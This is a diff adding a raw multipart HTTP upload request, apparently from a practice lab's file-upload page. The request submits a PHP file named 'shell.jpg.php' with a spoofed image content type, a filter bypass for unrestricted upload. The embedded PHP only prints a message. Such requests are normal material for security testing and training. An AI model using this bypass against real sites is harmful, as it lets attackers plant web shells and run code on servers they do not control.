@@ -1,0 +1,18 @@
+-----------------------------177131420424275287822046127545
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+-----------------------------177131420424275287822046127545
+Content-Disposition: form-data; name="uploaded"; filename="shell.jpg.php"
+Content-Type: image/jpeg
+
+<?php
+	echo "I Can Do Whatever I want!";
+?>
+
+-----------------------------177131420424275287822046127545
+Content-Disposition: form-data; name="Upload"
+
+Upload
+-----------------------------177131420424275287822046127545--
+
